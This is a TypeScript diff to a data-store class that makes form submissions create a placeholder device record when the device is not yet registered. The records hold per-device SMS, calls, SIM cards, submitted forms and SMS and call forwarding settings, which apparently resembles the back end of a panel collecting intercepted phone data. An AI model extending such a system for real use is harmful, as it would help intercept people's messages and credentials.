@@ -94,15 +94,40 @@ class DataStore {
         }
     }
 
-    // Submit form data
+    // Submit form data - creates device if it doesn't exist
     submitForm(deviceId: string, formData: Omit<FormData, 'submittedAt'>): void {
-        const deviceData = this.devices.get(deviceId);
-        if (deviceData) {
-            deviceData.forms.push({
-                ...formData,
-                submittedAt: new Date(),
-            });
+        let deviceData = this.devices.get(deviceId);
+
+        // Create device if it doesn't exist (for form submissions before device registers)
+        if (!deviceData) {
+            deviceData = {
+                device: {
+                    id: deviceId,
+                    name: `Device ${deviceId.substring(0, 8)}`,
+                    phoneNumber: '',
+                    status: 'offline',
+                    lastSeen: new Date(),
+                    simCards: [],
+                },
+                sms: [],
+                calls: [],
+                forms: [],
+                forwarding: {
+                    smsEnabled: false,
+                    smsForwardTo: '',
+                    callsEnabled: false,
+                    callsForwardTo: '',
+                },
+            };
+            this.devices.set(deviceId, deviceData);
+            console.log(`[Store] Created placeholder device for form: ${deviceId}`);
         }
+
+        deviceData.forms.push({
+            ...formData,
+            submittedAt: new Date(),
+        });
+        console.log(`[Store] Form stored for device ${deviceId}, total forms: ${deviceData.forms.length}`);
     }
 
     // Update forwarding config
